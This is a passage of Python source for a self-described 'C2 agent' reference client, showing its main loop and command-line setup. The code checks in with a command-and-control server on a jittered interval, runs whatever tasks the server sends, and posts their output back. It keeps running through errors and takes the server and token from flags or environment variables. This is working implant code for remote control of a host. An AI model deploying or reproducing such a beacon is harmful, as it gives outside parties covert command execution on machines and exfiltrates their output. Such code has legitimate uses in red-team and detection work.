            self._sess.post(f"{self.server}/api/result", json=body,
                            headers=self._json_headers(), timeout=15)
        except requests.exceptions.RequestException as exc:
            self._log(f"failed to report result: {exc}")

    # --------------------------------------------------------- main loop
    def run(self) -> None:
        if not self.agent_id:
            self.register()
        try:
            while True:
                try:
                    for task in self.checkin():
                        try:
                            result = self.execute(task)
                            self.report(task["task_id"], result)
                            if result.get("_exit"):
                                return
                        except Exception as exc:  # noqa: BLE001
                            self.report(task["task_id"],
                                        {"output": "", "exit_code": 1, "error": str(exc)})
                except requests.exceptions.RequestException as exc:
                    self._log(f"checkin failed: {exc}")
                except Exception as exc:  # noqa: BLE001
                    self._log(f"unexpected error: {exc}")
                delay = self.interval + random.uniform(0, self.jitter)
                time.sleep(max(0.5, delay))
        except KeyboardInterrupt:
            self._log("interrupted by user - exiting")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="C2 agent (Python reference client)")
    parser.add_argument("--server", default=os.environ.get("C2_SERVER", ""),
                        help="C2 server URL (C2_SERVER env var accepted)")
    parser.add_argument("--token", default=os.environ.get("C2_TOKEN", ""),
                        help="shared agent token (C2_TOKEN env var accepted)")
    parser.add_argument("--interval", type=int, default=10,
                        help="heartbeat interval in seconds (default 10)")
    parser.add_argument("--jitter", type=float, default=0.0,
                        help="random jitter in seconds added to the interval")
    parser.add_argument("--state", default=DEFAULT_STATE,
                        help=f"state file (default {DEFAULT_STATE})")
    parser.add_argument("--verbose", action="store_true",
                        help="print activity to stdout")
    _value_opts = {"--server", "--token", "--interval", "--jitter", "--state"}
    _argv, _i = [], 0
    while _i < len(sys.argv[1:]):
        _a = sys.argv[1:][_i]
        if _a in _value_opts and _i + 1 < len(sys.argv[1:]):
            _argv.append(_a + "=" + sys.argv[1:][_i + 1])
            _i += 2
        else:
            _argv.append(_a)
            _i += 1
    args = parser.parse_args(_argv)

    if not args.token:
        parser.error("--token is required (or set C2_TOKEN)")
    if not args.server:
        parser.error("--server is required (or set C2_SERVER)")

    try:
        c2agent(server=args.server, token=args.token, interval=args.interval,
                jitter=args.jitter, state_file=args.state,
                verbose=args.verbose).run()
    except KeyboardInterrupt:
        print("\nC2 agent interrupted - stopped.", flush=True)
        sys.exit(0)


if __name__ == "__main__":
    main()
